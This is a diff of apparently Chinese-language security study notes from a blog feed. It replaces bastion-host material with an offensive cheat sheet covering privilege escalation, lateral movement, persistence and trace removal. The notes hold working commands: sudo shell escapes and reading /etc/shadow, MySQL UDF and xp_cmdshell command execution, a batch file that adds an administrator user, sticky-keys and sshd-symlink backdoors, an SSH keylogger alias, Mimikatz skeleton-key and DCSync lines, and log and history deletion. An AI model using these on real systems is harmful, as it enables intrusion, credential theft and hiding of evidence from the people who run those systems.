-<li><p><strong>目标5W</strong>：What、Which、Where、Who、When即谁在什么时候，在哪个位置，能够干什么，并且它干了什么</p>
+<li><p>系统服务：可信任服务路径；例如<code>C:\\Program Files\x86</code>如果在<code>C:\\Program</code>下有Program.exe则会去执行后面字符串对应的文件；因为在系统盘下，所以会用相应系统权限去运行；以服务种植该木马，并将该马迁移到其他进程中，防止被发现</p>
 </li>
-<li><p><strong>模块</strong>：</p>
-<ol>
-<li>运维平台：RDP&#x2F;VNC运维；SSH&#x2F;Telnet运维；SFTP&#x2F;FTP运维；数据库运维；Web系统运维；远程应用运维；</li>
-<li>管理平台：三权分立；身份鉴别；主机管理；密码托管；运维监控；电子工单</li>
-<li>自动化平台：自动改密；自动运维；自动收集；自动授权；自动备份；自动告警</li>
-<li>控制平台：IP防火墙；命令防火墙；访问控制；传输控制；会话阻断；运维审批</li>
-<li>审计平台：命令记录；文字记录；SQL记录；文件保存；全文检索；审计报表</li>
-</ol>
+<li><p>不安全的服务权限：Java升级、AWVS、windows的升级等都需要系统权限；工具accesschk检查易受攻击的服务</p>
 </li>
-<li><p><strong>身份认证方式</strong>：本地认证（直接账密）、远程认证（远程账密）、双因子认证（验证码）、第三方认证（其他绑定的账密）</p>
+<li><p>注册表权限：工具Subinacl查找是否有不安全的注册表、Autorum可以设置自动启动</p>
 </li>
-<li><p><strong>运维方式</strong>：B&#x2F;S（借浏览器部署控制）、C&#x2F;S（客户端）、H5（页面登录控制）、网关</p>
-</li>
-<li><p><strong>部署方式</strong>：单机（旁挂在交换机旁）、HA高可靠部署（比前者多一个备份，且共用一个IP）、异地同步部署（多地多台）、集群部署（抽两个堡垒机当总的，一主一备）</p>
+<li><p>不安全的文件&#x2F;文件夹：.msi会以系统的权限开启（需要注册表中<code>Always Install Elevated</code>开启）</p>
 </li>
 </ul>
+<p>msf：<code>getsystem</code>以命名管道进行提权；<code>exploit/windows/local/bypassuac</code>模块可以对uac（用户账户控制）进行绕过；<code>post/multi/recon/local_exploit_Suggester</code>可以检测win-kernel漏洞；<code>exploit/windows/local/unquoted_service_path</code>对可信任服务路径进行利用;<code>~/service_permissions</code>进行不安全服务的利用；<code>~always_install_elevated</code>对.msi安装模块利用；</p>
+<p>CobalStrick中脚本管理可以安装.cna脚本（一整个包）</p>
+<h4 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h4><p>在LAMP中拿到webshell后得到www-data用户，权限极低；</p>
+<p>信息搜集：脚本linpeas.sh</p>
+<table>
+<thead>
+<tr>
+<th>信息</th>
+<th>路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>系统版本</td>
+<td>&#x2F;etc&#x2F;issue；&#x2F;etc&#x2F;*-realease</td>
+</tr>
+<tr>
+<td>内核版本</td>
+<td>uname -a&#x2F;-mrs</td>
+</tr>
+<tr>
+<td>环境变量</td>
+<td>&#x2F;etc&#x2F;profile；&#x2F;etc&#x2F;bashrc</td>
+</tr>
+<tr>
+<td>网络</td>
+<td>&#x2F;etc&#x2F;network&#x2F;interfaces；&#x2F;etc&#x2F;sysconfig&#x2F;network</td>
+</tr>
+<tr>
+<td>应用与服务</td>
+<td>&#x2F;etc&#x2F;services；ps -aux</td>
+</tr>
+<tr>
+<td>计划</td>
+<td>ls -alh；&#x2F;var&#x2F;spool&#x2F;cron</td>
+</tr>
+<tr>
+<td>应用配置</td>
+<td>&#x2F;etc&#x2F;apache2&#x2F;apache2.conf；&#x2F;my.conf（mysql）；&#x2F;httpd&#x2F;conf&#x2F;httpd.conf（nginx）</td>
+</tr>
+<tr>
+<td>网络通信</td>
+<td>netstat -antup</td>
+</tr>
+<tr>
+<td>Arp缓存</td>
+<td>arp -e</td>
+</tr>
+<tr>
+<td>防火墙</td>
+<td>iptables</td>
+</tr>
+<tr>
+<td>敏感信息</td>
+<td>&#x2F;etc&#x2F;passwd；&#x2F;group；&#x2F;shadow</td>
+</tr>
+</tbody></table>
+<p>拿到相关信息之后，在Exp-db中用Search sploit进行搜集</p>
+<ul>
+<li><p>内核提权：脏牛漏洞CVE-2016-5195（适用所有Linux内核2.6.22-3.9之间，32、64位OS）；CVE-2019-13272（适用于内核4.10-5.1.17）；CVE-2022-0874脏管漏洞（匿名管道限制不严格）</p>
+</li>
+<li><p>服务漏洞：dirty_sock（脏袜）漏洞CVE-2019-7304，snap（包管理工具）本地提权（适用于snap版本2.28-2.37，ubuntu18.10&#x2F;18.04LTS&#x2F;16.04LTS&#x2F;14.04LTS）</p>
+</li>
+<li><p>环境变量提权：终端中输入命令，查找PATH进行执行，偷梁换柱</p>
+</li>
+<li><p>Hash：参考1.2中密码文件目录，格式为&#x3D;用户名:密码:UID:GID:else:用户主目录:默认的shell，如果其中的密码显示x则证明密码存放在&#x2F;shadow中，格式为&#x3D;用户名:hash(密码)：x：x：多少天后过期：x：x：过期日期：x</p>
+</li>
+<li><p>sudo滥用：</p>
+</li>
+</ul>
+<pre><code>sudo /etc/sudoers	//配置文件
+sudo /bin/bash;/usr/bin/awk &#39;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#39;
+sudo curl file:///etc/shadow
+find -exec /bin/sh \; -quit
+</code></pre>
+<ul>
+<li><p>定时任务提权：系统定时任务-&#x2F;etc&#x2F;crontab；用户定时任务-&#x2F;var&#x2F;spool&#x2F;cron；<code>crontab</code>查看定时任务（格式&#x3D;分：时：日：月：周：命令）</p>
+</li>
+<li><p>SUID提权：suid&#x3D;super uid；该权限作用于可执行文件上，谁执行后谁就成为属主，此时能够继承创建该文件的人的权限，但仅在运行时有用；</p>
+</li>
+<li><p>隐藏文件：.xx（以.开头的为隐藏文件），<code>find / -name &quot;.*&quot; -type f -exec ls -al &#123;&#125;\;2&gt;/dev/null</code></p>
+</li>
+<li><p>NFS提权：NFS网络文件系统，将目标home目录挂载到本地；<code>showmount -e IP</code>显示可挂载的盘—》在&#x2F;mnt下mkdir—》<code>mount IP:目标 /本地地址</code>—》查找&#x2F;etc&#x2F;passwd下相关UID&amp;GID—》创建对应的组和用户（<code>group add -g GID; adduser 名 -uid UID -gid GID</code>），用以使用该身份提权—》（可选）生成ssh，将公钥放置到目标挂载盘中，方便后续进入</p>
+</li>
+</ul>
+<h4 id="数据库应用提权"><a href="#数据库应用提权" class="headerlink" title="数据库应用提权"></a>数据库应用提权</h4><p>SQLmap即可</p>
+<ol>
+<li><p>在MySql中UDF（用户定义函数）存在于mysql&#x2F;lib&#x2F;plugin&#x2F;下，为udf.dll或udf.so；使用数据流ADS在命令行中进行目录创建<code>echo &quot;xx&quot; &gt;名 :: $INDEX_ALLOCATION</code>（mysql&gt;5.1时没有plugin文件，需要自己创建）</p>
+<p><code>select &#39;xxx&#39; into outfile &#39;C:\\名::$INDEX_ALLOCATION&#39;;</code>创建&#x2F;lib&#x2F;plugin目录</p>
+<ol>
+<li><p>创建临时表，设置一个BLOB（大型二进制文件）类型</p>
+</li>
+<li><p>插入值CONVERT（udf.dll的16进制，CHAR类型）</p>
+</li>
+<li><p>将数据库内容导出为<code>C:\mysql\xxx\lib\plugin\udf.dll</code></p>
+</li>
+<li><p>删除上述表</p>
+</li>
+<li><p><code>create FUNCTION cmdshell returns string soname&#39;udf.dll&#39;;</code></p>
+</li>
+<li><p>输入命令<code>select cmdshell(&quot;whoami&quot;);</code></p>
+</li>
+</ol>
+</li>
+</ol>
+<p>msf中：exploit&#x2F;multi&#x2F;mysql&#x2F;mysql_udf_payload模块</p>
+<ol start="2">
+<li>SQL server：使用<code>net user x x/add &amp; net localgroup administrators x /add</code>增加SA管理员账户，需要sysadmin权限，普通用户无法依靠SQL Server提权（有该权限的话就可以），需要开启xp_cmdshell SQL，语句如下:</li>
+</ol>
+<pre><code class="sql">EXEC sp_configure &#39;show advanced options&#39;,1
+GO
+RECONFIGURE
+GO
+EXEC sp_configure &#39;xp_cmdshell&#39;,1
+GO
+RECONFIGURE
+Go
+</code></pre>
+<p><code>exec master..xp_cmdshell &quot;dos命令&quot;</code>；其他类似存储过程<code>sqlserveragent、sp_oacrate、xp_regwrite</code></p>
+<ol start="3">
+<li>Postgresql：pg_hba.conf具有db的访问权限</li>
+</ol>
+<h4 id="FTP应用提权"><a href="#FTP应用提权" class="headerlink" title="FTP应用提权"></a>FTP应用提权</h4><p>在win下自带的ftp应用中如果权限过高<code>quote site exec net user temp temp /add </code>可以为系统添加temp用户。下面是相关FTP软件的提权</p>
+<ol>
+<li>Serv-U</li>
+</ol>
+<p>默认端口43958，默认管理用户<code>LocalAdministrator-#1@ak#.lk;0@P</code>，在webshell一般没有回显，返回状态<code>200 EXEC command successful</code>表示成功，密码保存在Serv-U目录下的<code>ServUAdmin.exe</code>中，Hex打开；</p>
+<p>或者修改配置文件，直接添加FTP用户；<code>ServUDaemon.ini</code>中保存了所有的ftp账户信息</p>
+<ol start="2">
+<li>G6 FTP</li>
+</ol>
+<p>默认监听端口8021，安装目录下<code>RemoteAdmin/Remote.ini</code>保存着远程管理账户信息，默认以MD5加密。之后使用LXC进行端口转发，本软件不支持远程连接，本地连接成功后新建最高权限FTP用户：</p>
+<p>新建User.bat，并上传，目的是为系统建立一个名为temp，密码为123456的管理员用户</p>
+<pre><code class="cmd">@echo off
+net user temp 123456 /add
+net localgroup administrators temp /add
+</code></pre>
+<ol start="3">
+<li>FileZilla</li>
+</ol>
+<p>默认端口14147，<code>FileZillaServer Interface.xml</code>保存的是所有FTP管理员信息，<code>FileZillaServer.xml</code>保存服务器所有FTP用户信息；默认情况下也不支持远程连接，同样需要端口转发；建立新用户之后并远程连接后：</p>
+<p>设置新用户路径为C盘—登录FTP将<code>C:\Windows\system32\sethc.exe</code>删除并替换为cmd.exe，也就是粘滞键</p>
+<ol start="4">
+<li>FlashFXP</li>
+</ol>
+<p>在其安装目录下，<code>Sites.dat、Stats.dat、quick.dat</code>中保留着历史信息—从服务器下载到本地—并复制到本地FlashFXP下替换—进入软件查看，使用星号密码查看器</p>
+<h4 id="提权辅助"><a href="#提权辅助" class="headerlink" title="提权辅助"></a>提权辅助</h4><ol>
+<li>3389远程桌面服务端口，RDP远程桌面协议，具体端口位置<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\</code>中的PortNumber属性代表终端连接的端口；防御：强口令、换端口；</li>
+<li>端口转发，工具LCX、reDuh</li>
+<li>启动项提权，参考权限维持</li>
+<li>DLL劫持，工具T00ls Lpk Sethc（利用system32下lpk.dll，因为每个exe运行时都要加载这个，且会判断当前文件夹中是否有该dll，没有则再跑到c盘下找）</li>
+</ol>
+<h4 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h4><p>打补丁、及时升级、定时杀毒、关闭危险端口、删除System32下敏感的EXE文件、删除不安全组件、安装一些服务器安全配置软件</p>
+<hr>
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>横向移动指的是，在攻破Web服务器后，我们能够对其下内网中的其他机器进行访问与文件传输；这里我们通常指的是Win的域下环境</p>
+<p>利用windows内置工具</p>
+<ol>
+<li><p>IPC+Schtasks(计划任务)&#x2F;AT(老版Schtasks)&#x2F;SC</p>
+<p>IPC$共享命名管道的资源，用于进程间通信，端口135、445开的时候说明目标有该服务；一般来说域中密码基本一致，由域控管理，获得账户密码后，我们对域控进行横向操作</p>
+<ol>
+<li><code>net use \\域控IP\ipc$ /user:账号 &quot;密码&quot;</code>通常使用管理员账号，此时我们可以向域控进行文件传输，方便后续操作</li>
+</ol>
+</li>
+<li><p>SC创建服务执行<code>SC //IP createtest binpath=&quot; &quot; obj=&quot; &quot; password=&quot; &quot;</code></p>
+</li>
+<li><p>WMIC：<code>wmic /node:IP /user:用户 /password:密码 process call</code></p>
+</li>
+<li><p>WinRM：远程管理服务，默认监听5985-http、5986-https</p>
+</li>
+</ol>
+<p>利用外置工具</p>
+<ol>
+<li><p>PsExec.exe、PsExec.py,搭配smbexec.py</p>
+</li>
+<li><p>Wmiexec.vbs（csscript.exe）、wmcmd.exe、wmiHacker（免杀，445端口）</p>
+</li>
+<li><p>pth-winexe：kali自带pth工具集；</p>
+<p>msf中<code>auxiliary/admin/smb/psexec_command</code>模块&amp;<code>exploit/windows/smb/psexec</code>模块；<code>auxiliary/admin/smb/ms17_010_command</code></p>
+</li>
+<li><p>Token窃取：</p>
+<p>win中包括授权D令牌（交互式会话登录）和模拟I令牌（非交互会话），均会在重启之后清除，D令牌所有者注销之后转换为I令牌；</p>
+<p>MSF中<code>load incognito</code>，ms14-068实现域内提权</p>
+<p>CS中hashdump、logonpasswords可用于获取凭证，Portscan可以扫描存活主机，也可以手动引入incognito.exe</p>
+</li>
+<li><p>SharpRDP：impacket套件</p>
+</li>
+</ol>
+<p><strong>域内横向移动</strong>：</p>
+<p>win的认证机制：本地认证、网络认证、域认证；</p>
+<p>在网络认证中主要用于_质询（chalenge&amp;response）_协议（NTLM v1&#x2F;v2&#x2F;session v2）；具体步骤如下;</p>
+<ol>
+<li>客户端向服务端发送请求，</li>
+<li>服务端对客户端验证确实有该用户后，随机生成challenge，再challenge1&#x3D;hash(用户名，challenge)存到内存，返回challenge</li>
+<li>客户端收到challenge通过协商好的算法进行response&#x3D;hash(用户名，challenge)</li>
+<li>客户端发送response与服务端的challenge1对比验证</li>
+</ol>
+<p>域认证基于Kerberos协议：客户向KDC申请，KDC中的AS（检查服务）进行检查生成AD，验证成功之后返回TGT给客户；如果客户想要访问特定服务器需要再次向KDC申请，其中的TGS判断权限合格后返回特定的Ticket</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Ticket</td>
+<td>凭证</td>
+</tr>
+<tr>
+<td>KDC</td>
+<td>密钥分发中心</td>
+</tr>
+<tr>
+<td>TGT</td>
+<td>生成凭证，在内存中</td>
+</tr>
+<tr>
+<td>AD</td>
+<td>存储NTLM hash</td>
+</tr>
+<tr>
+<td>TGS</td>
+<td>票据授予服务</td>
+</tr>
+</tbody></table>
+<p>PTH：哈希传递攻击（445端口、SMB、admin$共享）；msf中<code>auxiliary/admin/smb/psexec_command</code>和用于域和工作组的<code>exploit/windows/smb/psexec</code>；minikatz、powershell、CS、Impacket套件中的wmiexec.py&amp;smbexec.py均可以用于PTH；</p>
+<p>其他还有PTK密钥传递攻击、PTT票据传递攻击</p>
+<hr>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><h4 id="Win下权限维持"><a href="#Win下权限维持" class="headerlink" title="Win下权限维持"></a>Win下权限维持</h4><p>后门安装包含注册表后门（persistence）&amp;服务后门（metsvc）【msf模块】</p>
+<ol>
+<li><p>首先上传vbs，修改为自启动，无需认证</p>
+</li>
+<li><p><code>run metsvc -A</code>设置上述脚本为开机自启动服务型后门（31337端口）</p>
+<p><code>use exploit/multi/handler</code>&amp;<code>set payload windows/metsvc_bind_tcp</code></p>
+</li>
+<li><p>AutorunScript获取shell时自动执行该持续化脚本</p>
+</li>
+</ol>
+<ul>
+<li><p>系统工具替换后门（开机辅助工具）：narrator讲述人劫持、utilman辅助工具管理器等。</p>
+</li>
+<li><p>shift后门：登录windows时，按5次shift，将粘滞键</p>
+</li>
+</ul>
+<p>msf相关利用<code>post/windows/manage/sticky_keys</code>；原理：注册表&#x3D;<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>下寻找目标替换应用，添加<code>debugger</code>参数，将其赋值为后门木马路径</p>
+<p>同理可以更改Notepad，为其添加参数，使得Notepad退出之后能够后台运行后门木马。</p>
+<p>开机自启动注册表项：先后顺序如下</p>
+<p><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>—&gt;<code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>—&gt;<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>—&gt;<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code></p>
+<p>此外<code>\RunOne \RunServiceOnce \Runservices</code>只执行一次</p>
+<p>其他方式：</p>
+<ul>
+<li><p>快捷方式劫持，更改目标文件位置</p>
+</li>
+<li><p>账户隐藏xxx$（net user无法看到，但控制面板能看）</p>
+</li>
+<li><p>后门账号&#x2F;克隆账号（控制面板看不到但注册表一定能看）：</p>
+<ol>
+<li>创建$用户到admin组中</li>
+<li>admin对应的F值赋值给<code>$</code>用户（导出<code>$</code>用户的键值和F值以及admin的F值）</li>
+<li>将admin（F）赋值给$（F），之后删除<code>$</code>用户</li>
+<li>导入<code>$</code>用户的F和键值</li>
+</ol>
+</li>
+<li><p>文件夹启动：<code>C:\Users\Lenovo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></p>
+</li>
+<li><p>服务后门：一般情况下杀软会进行拦截（Task-powershell脚本）</p>
+</li>
+</ul>
+<h4 id="Linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h4><ul>
+<li><p>软链接sshd：<code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oport=12345</code></p>
+<ol>
+<li><code>ssh root@IP -p 12345</code>输入任何密码就可以root登录</li>
+</ol>
+</li>
+<li><p>ssh server wrapper：<code>ssh-keygen -t rsa</code>将公钥送到目标靶机上</p>
+</li>
+<li><p>ssh key logger：在靶机.bashrc中添加<code>alias ssh=&#39;strace -o /tmp/sshpwd -&#39;date+%d%h%m%s&#39;.log -e read,write,connect -s2048 ssh&#39;</code>输入的所有键盘记录都会在log中存储</p>
+</li>
+<li><p>Vim中默认含有python扩展</p>
+</li>
+<li><p>alias后门：键盘记录；Crontab后门：定时任务</p>
+</li>
+<li><p>setuid：使文件打开者在使用时拿到所有者权限</p>
+<p>setgid：作用于目录，用户打开该目录后自动加入到该目录所属组</p>
+</li>
+<li><p>文件隐藏touch文件，隐藏权限<code>chattr +i/-i</code>给所属文件加锁用于防止删除</p>
+</li>
+<li><p>命令无痕模式：<code>set +o history</code>（上下键还有，history命令看不出来）</p>
+</li>
+<li><p>删除命令历史：<code>sed -i 100,$d,bash_history</code>删除100行之后的命令；指定行<code>history -d 100</code></p>
+</li>
+</ul>
+<h4 id="域内权限维持"><a href="#域内权限维持" class="headerlink" title="域内权限维持"></a>域内权限维持</h4><ul>
+<li>黄金票据伪造（PTT）</li>
+</ul>
+<p>条件：域名称+域SID+域的KRBTGT的账号密码的hash+伪造用户</p>
+<blockquote>
+<p>whoami &amp; minikatz lasdump::dcsync &#x2F;user:krbtge@域名</p>
+</blockquote>
+<ul>
+<li>minikatz中的Skeleton key</li>
+</ul>
+<p>无需重启，适用于winServer03-12（万能密码，不能该用户，默认‘minikatz’），权限在重新启动之后失效，需要安装<code>privilege::debug &amp;&amp; misc::skeleton</code></p>
+<ul>
+<li>SID history</li>
+</ul>
+<p>用于跟踪安全主体控制用户连接资源时的访问权限：当用户从A域到B域时，SID会变，但是SID History中会保留在A域中的权限；minikatz中<code>privilege::debug &amp;&amp; sid::patch &amp;&amp; sid::add /sam::名 /new:adminstrator</code></p>
+<hr>
+<h3 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h3><ul>
+<li>windows</li>
+</ul>
+<p>日志位置<code>C:\Windows\System32\winevt\Logs</code>||在win+r中键入<code>eventwr.msc</code>；该日志使用事件查看器打开，包含：应用程序运行记录（Application）、安全账号改动等（Security）、系统驱动和软件崩溃等（System）、设置setup、转发事件；</p>
+<p>wevtutil.exe用于检索、删除、导出等对日志的操作</p>
+<p>msf：<code>net user username /del</code>删除账号，<code>clearv</code>删除日志，<code>sessions -k</code>关闭所有的meterpreter，<code>run event_manager -i/-c</code>i看日志c删除日志</p>
+<p>停止记录日志：ps脚本的Invoke-phantOm，eventlog-&gt; svchost执行</p>
+<ul>
+<li>Linux（）</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>路径</th>
+<th>记录内容</th>
+<th>查看命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#x2F;var&#x2F;log&#x2F;wtmp</td>
+<td>所有成功的登录记录</td>
+<td>last</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;btmp</td>
+<td>所有的失败的登陆记录</td>
+<td>lastb（无法修改，在root下删除）</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;lastlog</td>
+<td>最近登陆记录</td>
+<td>lastlog</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;run&#x2F;utmp</td>
+<td>当前登录用户的信息</td>
+<td>who</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log</td>
+<td>nginx日志</td>
+<td></td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;cron</td>
+<td>定时任务日志</td>
+<td></td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;secure</td>
+<td>授权、账户信息等</td>
+<td></td>
+</tr>
+</tbody></table>
 ]]></content>
       <categories>
         <category>网络安全</category>
